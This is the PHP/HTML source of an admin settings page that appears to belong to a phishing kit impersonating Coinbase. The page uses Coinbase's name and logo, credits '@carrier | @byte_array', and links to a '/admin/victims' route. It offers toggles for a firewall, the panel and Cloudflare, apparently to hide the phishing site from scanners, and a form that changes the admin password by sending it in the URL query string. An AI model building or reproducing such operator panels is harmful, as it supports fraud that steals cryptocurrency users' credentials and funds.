<?php
session_start();
if(!isset($_SESSION['user_id']) && !isset($_SESSION['username'])){
    header('Location: /admin/login');
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Settings - Coinbase</title>
<link href="https://cdn.jsdelivr.net/npm/modern-css-reset/dist/reset.min.css" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-dark/dark.min.css" rel="stylesheet">
<link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
<link rel="icon" href="https://images.ctfassets.net/q5ulk4bp65r7/3TBS4oVkD1ghowTqVQJlqj/2dfd4ea3b623a7c0d8deb2ff445dee9e/Consumer_Wordmark.svg" type="image/png">
<style>
    body {
        background: #000; 
        color: #e0e0e0;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        margin: 0;
        padding: 0;
        height: 100vh;
    }
    .navbar {
        background-color: #000; 
        padding: 10px 20px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        box-shadow: 0 2px 5px rgba(0,0,0,0.5);
    }
    .navbar a {
        color: #e0e0e0;
        text-decoration: none;
        font-size: 16px;
    }
    .settings-container {
        display: flex;
        flex-direction: column;
        padding: 20px;
        height: calc(100vh - 50px);
        align-items: center;
    }
    .settings-row {
        background-color: #060505; 
        padding: 17px;
        width: 80%;
        border-radius: 8px;
        margin-bottom: 20px;
        box-shadow: 0 4px 8px rgba(0,0,0,0.5);
        display: flex;
        justify-content: space-between;
    }
    .switch {
        position: relative;
        display: inline-block;
        width: 60px;
        height: 34px;
    }
    .switch input { 
        opacity: 0;
        width: 0;
        height: 0;
    }
    .slider {
        position: absolute;
        cursor: pointer;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-color: #ffffff3b;
        transition: .4s;
        border-radius: 34px;
    }
    .slider:before {
        position: absolute;
        content: "";
        height: 26px;
        width: 26px;
        left: 4px;
        bottom: 4px;
        background-color: white;
        transition: .4s;
        border-radius: 50%;
    }
    input:checked + .slider {
        background-color: #28a745;
    }
    input:checked + .slider:before {
        transform: translateX(26px);
    }
    form {
        display: flex;
        align-items: center;
    }
    input[type="password"], button {
        padding: 10px;
        margin: 10px;
        border-radius: 5px;
        border: none;
    }
    input[type="password"] {
        background-color: #060505;
        color: #fff;
        border: 1px solid #ffffff3b;
    }
    button {
        background-color: #28a745;
        color: white;
        cursor: pointer;
    }

    .admin-nav {
        display: flex;
        justify-content: space-between;
        background-color: #060505;
        padding: 10px;
        border-radius: 5px;
    }

    .admin-nav-link {
        color: #fff;
        text-decoration: none;
        padding: 5px 15px;
        border-radius: 3px;
        transition: background-color 0.3s;
    }

    .admin-nav-link:hover {
        background-color: #555;
    }
</style>
</head>
<body>
<div class="navbar">
    <a href="#" style="display: flex; align-items: center;">
        <img src="https://images.ctfassets.net/q5ulk4bp65r7/3TBS4oVkD1ghowTqVQJlqj/2dfd4ea3b623a7c0d8deb2ff445dee9e/Consumer_Wordmark.svg" alt="Coinbase Logo" style="height: 20px; width: auto; margin-right: 10px;">
        - @carrier | @byte_array
    </a>
    <nav class="admin-nav">
        <a href="/admin" class="admin-nav-link">Dashboard</a>
        <a href="/admin/victims" class="admin-nav-link">Firewall</a>
        <a href="/admin/settings" class="admin-nav-link">Settings</a>
    </nav>
</div>
<div class="settings-container">
    <div class="settings-row">
        <h2>Firewall Toggle</h2>
        <label class="switch">
            <input type="checkbox" id="firewallToggle">
            <span class="slider"></span>
        </label>
    </div>
    <div class="settings-row">
        <h2>Panel Toggle</h2>
        <label class="switch">
            <input type="checkbox" id="panelToggle">
            <span class="slider"></span>
        </label>
    </div>
    <div class="settings-row">
        <h2>Cloudflare Toggle</h2>
        <label class="switch">
            <input type="checkbox" id="cloudflareToggle">
            <span class="slider"></span>
        </label>
    </div>
    <div class="settings-row" style="align-items: center;">
        <h2 style="margin-right: 20px;">Change Admin Password</h2>
        <form id="passwordChangeForm">
            <input id="passwordChange" type="password" placeholder="New Password" name="newPassword" required>
            <button type="submit">Update</button>
        </form>
    </div>
</div>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
<script>
    document.addEventListener('DOMContentLoaded', function() {
        fetch('/admin/actions?action=view_firewall')
        .then(response => response.json())
        .then(data => {
            if (data.firewall == 1) {
                document.getElementById('firewallToggle').checked = true;
            }
        });

        fetch('/admin/actions?action=view_panel')
        .then(response => response.json())
        .then(data => {
            if (data.panel == 1) {
                document.getElementById('panelToggle').checked = true;
            }
        });

        fetch('/admin/actions?action=view_cf')
        .then(response => response.json())
        .then(data => {
            if (data.cf == 1) {
                document.getElementById('cloudflareToggle').checked = true;
            }
        });
    });

    document.getElementById('firewallToggle').addEventListener('change', function() {
        var firewallStatus = this.checked ? 'on' : 'off';
        fetch(`/admin/actions?action=turn_${firewallStatus}_firewall`)
        .then(response => response.json())
        .then(data => Swal.fire({
            title: 'Status',
            text: data.message,
            icon: 'success',
            confirmButtonText: 'Done',
            background: '#060505',
            color: '#e0e0e0',
            fontFamily: 'Segoe UI',
            fontSize: '16px'
        }));
    });

    document.getElementById('panelToggle').addEventListener('change', function() {
        var panelStatus = this.checked ? 'on' : 'off';
        fetch(`/admin/actions?action=turn_${panelStatus}_panel`)
        .then(response => response.json())
        .then(data => Swal.fire({
            title: 'Status',
            text: data.message,
            icon: 'success',
            confirmButtonText: 'Done',
            background: '#060505',
            color: '#e0e0e0',
            fontFamily: 'Segoe UI',
            fontSize: '16px'
        }));
    });

    document.getElementById('passwordChangeForm').addEventListener('submit', function(e) {
        e.preventDefault();
        var newPassword = document.getElementById('passwordChange').value;
        fetch(`/admin/actions?action=change_password&newPassword=${newPassword}`)
        .then(response => response.json())
        .then(data => Swal.fire({
            title: 'Status',
            text: data.message,
            icon: 'success',
            confirmButtonText: 'Done',
            background: '#060505',
            color: '#e0e0e0',
            fontFamily: 'Segoe UI',
            fontSize: '16px'
        }));
    });

    document.getElementById('cloudflareToggle').addEventListener('change', function() {
        var cloudflareStatus = this.checked ? 'on' : 'off';
        fetch(`/admin/actions?action=turn_${cloudflareStatus}_cf`)
        .then(response => response.json())
        .then(data => Swal.fire({
            title: 'Status',
            text: data.message,
            icon: 'success',
            confirmButtonText: 'Done',
            background: '#060505',
            color: '#e0e0e0',
            fontFamily: 'Segoe UI',
            fontSize: '16px'
        }));
    });

</script>
</body>
</html>
